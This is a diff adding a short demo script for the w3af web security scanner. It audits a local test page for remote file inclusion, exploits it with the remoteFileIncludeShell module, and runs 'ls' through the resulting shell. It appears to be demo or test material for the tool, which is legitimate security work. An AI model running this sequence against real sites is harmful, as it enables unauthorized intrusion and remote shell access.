@@ -1,0 +1,25 @@
+# This is the remoteFileInclude demo:
+
+plugins
+audit remoteFileInclude
+audit config remoteFileInclude
+view
+set usew3afSite True
+back
+output console,textFile
+output
+output config textFile
+set fileName output-w3af.txt
+set verbosity 10
+back
+back
+target
+set target http://localhost/w3af/remoteFileInclusion/vulnerable.php?file=f0as9
+back
+start
+exploit
+exploit config remoteFileIncludeShell
+set listenAddress 127.0.0.1
+back
+exploit remoteFileIncludeShell
+ls
